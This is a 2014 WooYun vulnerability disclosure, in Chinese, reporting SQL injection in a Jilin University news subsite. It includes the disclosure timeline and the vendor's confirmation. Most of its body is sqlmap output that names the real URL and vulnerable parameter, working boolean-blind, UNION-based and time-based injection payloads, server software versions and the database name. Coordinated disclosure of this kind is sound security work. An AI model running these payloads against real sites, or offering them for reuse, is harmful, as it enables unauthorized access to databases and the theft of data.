wybug_title: 吉林大学分站注射漏洞
wybug_detail: 漏洞详情 披露状态：   									2014-06-07：	细节已通知厂商并且等待厂商处理中									2014-06-09：	厂商已经确认，细节仅向厂商公开									2014-06-19：	细节向核心白帽子及相关领域专家公开									2014-06-29：	细节向普通白帽子公开									2014-07-09：	细节向实习白帽子公开									2014-07-23：	细节向公众公开  简要描述： 吉林大学分站SQL注射漏洞 详细说明：  http://xiaobao.jlu.edu.cn/newindex/newspic.php?qishu=369   漏洞证明：  Place: GETParameter: qishu    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: qishu=369 AND 5550=5550    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: qishu=369 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7175767671,0x50696b71526655646875,0x71767a6f71),NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: qishu=369 AND 4583=BENCHMARK(5000000,MD5(0x517a6f76))---web application technology: PHP 4.3.11, Apache 2.0.50back-end DBMS: MySQL < 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: qishu    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: qishu=369 AND 5550=5550    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: qishu=369 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7175767671,0x50696b71526655646875,0x71767a6f71),NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: qishu=369 AND 4583=BENCHMARK(5000000,MD5(0x517a6f76))---web application technology: PHP 4.3.11, Apache 2.0.50back-end DBMS: MySQL 4available databases [1]:[*] xiaobao   修复方案：  参数过滤   版权声明：转载请注明来源 Hotler0o@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-09 09:40 厂商回复： 谢谢 最新状态： 暂无
